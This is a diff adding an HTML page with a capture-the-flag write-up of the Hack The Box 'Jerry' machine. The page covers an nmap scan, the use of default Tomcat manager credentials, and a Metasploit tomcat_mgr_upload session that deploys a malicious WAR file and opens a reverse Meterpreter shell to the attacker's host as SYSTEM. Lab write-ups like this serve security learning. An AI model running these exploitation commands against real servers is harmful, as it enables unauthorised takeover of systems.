@@ -1,0 +1,84 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Jerry</h1>
+    <p class="text">Difficulty : Easy | UserDifficulty : 2.7</p>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV &lt;target_ip&gt; --min-rate=2000</u>
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-title: Apache Tomcat/7.0.88
+|_http-favicon: Apache Tomcat
+|_http-server-header: Apache-Coyote/1.1</code></pre></div>
+
+
+<p class="text">Only http server is open on target's port 8080. </p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/jerry/1-home.png' %}" alt="">
+    <p class="text">Here is Tomcat Apache default page. When I try to access <u>manager webapp</u>, it require me to enter credentials. We need to find credentials to enter.</p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/jerry/2-pass.png' %}" alt="">
+    <p class="text">However, as soon as I canceled input form, page was redirected and gave me credentials <u>tomcat@s3cret</u>. Idk why.</p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/jerry/3-mgr.png' %}" alt="">
+    <p class="text">I successfully entered manager webapp with the credentials. Also I found war file upload field. If there is no strong restriction, it probably let us to get reverse shell by uploading malicious war file.</p>
+</div>
+
+<p class="text">Googling with keyword "tomcat manager malicious war file" returned me a msfconsole exploit "multi/http/tomcat_mgr_upload" in <a href="https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/">this</a> page. Let's use this.</p>
+
+<p class="text">As we can know from the name of the page, we have to set credential.</p>
+<div class="code-box"><pre><code>└─$ <u>msfconsole</u>
+msf6 > <u>use exploit/multi/http/tomcat_mgr_upload</u>
+msf6 exploit(multi/http/tomcat_mgr_upload) > <u>set rhosts 10.129.136.9</u>
+rhosts => 10.129.136.9
+msf6 exploit(multi/http/tomcat_mgr_upload) > <u>set rport 8080</u>
+rport => 8080
+msf6 exploit(multi/http/tomcat_mgr_upload) >  <u>set HttpPassword s3cret</u>
+HttpPassword => s3cret
+msf6 exploit(multi/http/tomcat_mgr_upload) > <u>set HttpUsername tomcat</u>
+HttpUsername => tomcat
+msf6 exploit(multi/http/tomcat_mgr_upload) > <u>set lhost 10.10.14.56</u>
+lhost => 10.10.14.56
+msf6 exploit(multi/http/tomcat_mgr_upload) > <u>set lport 4444</u>
+lport => 4444</code></pre></div>
+
+
+
+<div class="code-box"><pre><code>msf6 exploit(multi/http/tomcat_mgr_upload) > <u>exploit</u>
+[*] Started reverse TCP handler on 10.10.14.56:4444 
+[*] Retrieving session ID and CSRF token...
+[*] Uploading and deploying 9a8Xit6KpvyKDrvfw504gqQhyz...
+[*] Executing 9a8Xit6KpvyKDrvfw504gqQhyz...
+[*] Sending stage (58073 bytes) to 10.129.136.9
+[*] Undeploying 9a8Xit6KpvyKDrvfw504gqQhyz ...
+[*] Undeployed at /manager/html/undeploy
+[*] Meterpreter session 1 opened (10.10.14.56:4444 -> 10.129.136.9:49192) at 2025-10-12 07:56:18 -0400
+meterpreter > <u>shell</u>
+Process 1 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+C:\apache-tomcat-7.0.88><u>whoami</u>
+whoami
+nt authority\system</code></pre></div>
+
+
+<p class="text">We got authority account. You can find get user and root flags in <u>C:\Users\Administrator\Desktop\flags</u>.</p>
+
+</body>
+</html>
